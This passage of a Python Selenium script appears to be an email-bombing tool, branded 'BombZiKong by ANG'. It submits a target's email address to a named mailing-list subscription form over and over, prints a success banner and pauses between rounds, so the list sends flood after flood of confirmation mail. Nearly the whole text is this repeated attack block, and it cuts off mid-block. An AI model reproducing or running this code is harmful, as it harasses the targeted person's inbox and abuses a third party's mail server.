browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
